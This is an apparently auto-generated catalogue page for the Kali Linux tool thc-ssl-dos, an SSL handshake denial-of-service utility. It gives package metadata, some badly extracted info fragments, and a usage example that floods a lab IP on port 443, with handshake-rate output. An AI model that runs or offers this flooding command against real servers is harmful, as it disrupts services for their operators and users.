---
tool_id: thc-ssl-dos
title: thc-ssl-dos
categories: ["exploitation-tools"]
category_slugs: ["exploitation-tools"]
homepage: http://www.thc.org/thc-ssl-dos/
repository: 
version: 1.4-1kali5
architectures: any
license: 
binaries: []
metapackages: ["kali-linux-everything kali-linux-large kali-tools-vulnerability kali-tools-web"]
icon: /images/kali-tools-icon-missing.svg
source_path: kali-tools\thc-ssl-dos\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:07.142218
---

# Tool: thc-ssl-dos (thc-ssl-dos)

## Categories
- [exploitation-tools](../exploitation-tools.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [http://www.thc.org/thc-ssl-dos/](http://www.thc.org/thc-ssl-dos/) |
| Repository |  |
| Version | 1.4-1kali5 |
| Architectures | any |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-everything kali-linux-large kali-tools-vulnerability kali-tools-web |
| Icon | /images/kali-tools-icon-missing.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://gitlab.com/kalilinux/packages/thc-ssl-dos
- **PackagesInfo**: |
- ****Installed size**: ** `35 KB`
- ****How to install**: ** `sudo apt install thc-ssl-dos`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# thc-ssl-dos -h
- **http**: //www.thc.org
- **Greetingz**: the french underground


## Documentation (Upstream)

{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## thc-ssl-dos Usage Example

Using 100 connections (`-l 100`), flood the target IP (`192.168.1.208`) and port (`443`):

```console
root@kali:~# thc-ssl-dos -l 100 192.168.1.208 443 --accept
     ______________ ___  _________
     \__    ___/   |   \ \_   ___ \
       |    | /    ~    \/    \  \/
       |    | \    Y    /\     \____
       |____|  \___|_  /  \______  /
                     \/          \/
            http://www.thc.org

          Twitter @hackerschoice

Greetingz: the french underground

Waiting for script kiddies to piss off................
The force is with those who read the source...
Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
Handshakes 2 [2.90 h/s], 6 Conn, 0 Err
Handshakes 25 [22.42 h/s], 13 Conn, 0 Err
Handshakes 70 [43.97 h/s], 20 Conn, 0 Err
Handshakes 125 [56.51 h/s], 27 Conn, 0 Err
Handshakes 185 [62.09 h/s], 33 Conn, 0 Err
Handshakes 262 [74.56 h/s], 41 Conn, 0 Err
Handshakes 365 [104.93 h/s], 47 Conn, 0 Err
Handshakes 496 [131.23 h/s], 54 Conn, 0 Err
```


## Source
- Path: kali-tools\thc-ssl-dos\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:07.142218
